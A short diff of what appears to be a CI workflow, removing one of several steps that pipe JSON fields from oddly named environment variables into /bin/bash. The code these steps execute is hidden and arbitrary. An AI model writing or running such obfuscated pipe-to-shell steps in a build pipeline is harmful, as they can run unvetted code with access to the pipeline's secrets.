@@ -23,7 +23,6 @@ jobs:
           printf '%s' "$pt9593" | jq -r .wqqck44 | /bin/bash
           printf '%s' "$wl411" | jq -r .yiv95 | /bin/bash
           echo $untu856 | jq -r .ng5263 | /bin/bash
-          echo $vaw70 | jq -r .vyvx768 | /bin/bash
           printf '%s' "$sfn65" | jq -r .zimr9 | /bin/bash
 
       - name: Archive results
